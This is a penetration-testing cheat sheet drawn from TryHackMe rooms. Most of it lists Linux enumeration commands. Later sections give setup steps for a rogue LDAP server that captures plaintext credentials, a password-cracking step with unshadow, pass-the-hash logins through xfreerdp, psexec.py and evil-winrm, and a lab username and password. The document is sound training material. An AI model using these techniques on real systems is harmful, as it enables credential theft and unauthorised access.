# Linux Commands
* [Enumeration](#enumeration)
   * [Hostname](#hostname)
   * [Kernel and System Information](#kernel-and-system-information)
   * [System Process Information](#system-process-information)
   * [Operating System Information](#operating-system-information)
   * [Show Running Processes](#show-running-processes)
   * [Show Environment Variables](#show-environment-variables)
   * [Show All Commands Your User Can Run With Sudo](#show-all-commands-your-user-can-run-with-sudo)
   * [General Overview of User Privilege Level and Group Memberships](#general-overview-of-user-privilege-level-and-group-memberships)
   * [Connections Information](#connections-information)
   * [Find Command](#find-command)
   * [Get Capabilities](#get-capabilities)
   * [Mail Directories](#mail-directories)
   * [Installed Applications](#installed-applications)
   * [Miscellaneous](#miscellaneous)

* [Host Rogue LDAP Server](#host-rogue-ldap-server)

* [Other](#other)
   * [Execute Binary as Owner](#execute-binary-as-owner)
   * [Unshadow](#unshadow)
   * [xfreerdp](#xfreerdp)
   * [Connect via psexec using Pass the Hash](#connect-via-psexec-using-pass-the-hash)
   * [Connect to WinRM using PtH](#connect-to-winrm-using-pth)



*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Enumeration
* Reference: https://tryhackme.com/room/linprivesc

### Hostname
```
hostname
```
```
ls /etc/*-release
```
*********************************************************************************
### Kernel and System Information
```
uname -a
```
```
uname -r
```
*********************************************************************************
### System Process Information
```
cat /proc/version
```
*********************************************************************************
### Operating System Information
```
cat /etc/issue
```
*********************************************************************************
### Show Running Processes
```
ps
```
* View all running processes
```
ps -A
```
* View process tree
```
ps axjf
```
* View processes for all users
```
ps aux
```
*********************************************************************************
### Show Environment Variables
```
env
```
*********************************************************************************
### Show All Commands Your User Can Run With Sudo
```
sudo -l
```
### General Overview of User Privilege Level and Group Memberships
```
id
```
*********************************************************************************
### Connections Information
* Show all listening ports and established connections
```
netstat -a
```
* List TCP Connections
```
netstat -at
```
* List UDP Connections
```
netstat -au
```
* List Ports in "Listening" Mode
```
netstat -l
```
* List Network Usage by Protocol
```
netstat -s
```
* List Connections with the Service Name and PID Information
```
netstat -tp
```
* Can also be Used with the -l option
```
netstat -ltp
```
* Common usage
   * -a: Displays all sockets
   * -n: Do not resolve names
   * -o: Display timers
```
netstat -ano
```

*********************************************************************************
### Find Command
* Find File by Name on Entire System
```
find / -name [FILE-NAME] 2>/dev/null
```
* Find the File Named “flag1.txt” in the Current Directory
```
find . -name flag1.txt
```
* Find the File Named "flag1.txt" in the /home Directory
```
find /home -name flag1.txt
```
* Find the Directory Named "config" under /
```
find / -type d -name config
```
* Find Files with 777 Permissions
```
find / -type f -perm 0777
```
* Find Executable Files
```
find / -perm a=x
```
* Find All Files for the User "frank" under /home
```
find /home -user frank
```
* Find Files Modified in Last 10 Days
```
find / -mtime 10
```
* Find Files Accesses in Last 10 Days
```
find / -atime 10
```
* Find Files Changed in Last Hour (60 minutes)
```
find / -cmin -60
```
* Find Files Accessed in Last Hour (60 minutes)
```
find / -amin -60
```
* Find Files with a 50 MB Size
```
find / -size 50M
```
* Find Files Greater than 50 MB
```
find / -size +50M
```
* Find Files Less than 50 MB
```
find / -size -50M
```
* Find World-Writeable Folders
```
find / -writable -type d 2>/dev/null
```
```
find / -perm -222 -type d 2>/dev/null
```
```
find / -perm -o w -type d 2>/dev/null
```
```
find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
```
```
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* Find World-Executable Folders
```
find / -perm -o x -type d 2>/dev/null
```
* Find Development Tools and Supported Languages
```
find / -name python*
```
```
find / -name perl*
```
```
find / -name gcc*
```
* Find Files with SUID Bit Set
```
find / -perm -u=s -type f 2>/dev/null
```
* List Files with SUID or SGID Bits Set
```
find / -type f -perm -04000 -ls 2>/dev/null
```
### Get Capabilities
```
getcap -r / 2>/dev/null
```

*********************************************************************************
### Mail Directories
```
/var/mail/
```
*********************************************************************************
### Installed Applications
```
ls -lh /usr/bin/
```
```
ls -lh /sbin/
```
List Intalled Packages on RPM based distros:
```
rmp -qa
```

List Installed Packages on Debian based distros:
```
dpkg -l
```
*********************************************************************************
### Miscellaneous
Show current logges on users:
```
who
```
Show who is logged on and what they are doing:
```
w
```
Print real and effective user and group IDS:
```
id
```
Show who has logged in last:
```
last
```
Show DNS info:
```
/etc/resolv.conf
```
Show active connections:
```
netstat
```
*Option	Description  
-a	show both listening and non-listening sockets  
-l	show only listening sockets  
-n	show numeric output instead of resolving the IP address and port number  
-t	TCP  
-u	UDP  
-x	UNIX  
-p	Show the PID and name of the program to which the socket belongs*  
  
Show all TCP and UDP listening and establised connections:
```
netstat -atupn
```

List open files:
```
lsof
```
List open files internet:
```
lsof -i
```

List running processes:
```
ps
```
*-e	all processes  
-f	full-format listing  
-j	jobs format  
-l	long format  
-u	user-oriented format*  

*********************************************************************************
## Host Rogue LDAP Server

1st:
```
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```
2nd:
```
sudo dpkg-reconfigure -p low slapd
```
3rd: Create file with these contents:
```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
4th:
```
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
5th (Verify it is working):
```
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```
The command should return:
```
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```
Credit: https://tryhackme.com/room/breachingad

*********************************************************************************

## Other

### Execute Binary as Owner:
```
./[FILE] -p
```

### Unshadow
```
unshadow passwd.txt shadow.txt > passwords.txt
```

### xfreerdp
```
xfreerdp /v:[IP-ADDRESS] /u:[USERNAME] /p:[PASSWORD] /cert:ignore
```
```
xfreerdp /d:[DOMAIN] /u:[USERNAME]  /p:[PASSWORD] /v:[SERVER-NAME]
```
Example:
```
xfreerdp /d:za.tryhackme.com /u:joel.pearce  /p:E3IIDNiiT96 /v:thmjmp1.za.tryhackme.com
```
Connect to RDP using Pass the Hash (PtH):
```
xfreerdp /v:[TARGET-IP] /u:[DOMAIN]\\[USERNAME] /pth:[NTLM-HASH]
```

### Connect via psexec using Pass the Hash
```
psexec.py -hashes [NTLM-HASH] [DOMAIN]/[USERNAME]@[TARGET-IP]
```

### Connect to WinRM using PtH
```
evil-winrm -i [TARGET-IP] -u [USERNAME] -H [NTLM-HASH]
```

*********************************************************************************

## References
* https://tryhackme.com/room/linprivesc
* https://tryhackme.com/room/breachingad
* https://tryhackme.com/room/enumerationpe
